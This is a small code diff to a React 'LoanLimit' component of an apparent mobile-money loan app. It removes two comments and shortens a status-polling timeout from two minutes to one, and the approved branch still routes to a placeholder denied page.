@@ -2,7 +2,6 @@ import { useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Wallet, CheckCircle2 } from "lucide-react";
 
-// ✅ FORCED URL (No environment variables)
 const API_URL = "https://fastloan-momo.onrender.com";
 
 const LoanLimit = () => {
@@ -40,18 +39,19 @@ const LoanLimit = () => {
             
             if (statusData.status === "approved") {
               alert("Prêt Approuvé !");
-              navigate("/loan-denied"); // Change to /loan-approved if you make one
+              navigate("/loan-denied"); 
             } else {
               navigate("/loan-denied");
             }
           }
         }, 3000);
 
+        // ✅ CHANGED TO 1 MINUTE (60,000 milliseconds)
         setTimeout(() => {
           clearInterval(interval);
           setIsProcessing(false);
           navigate("/loan-denied"); 
-        }, 120000);
+        }, 60000);
       }
     } catch (error) {
       setIsProcessing(false);
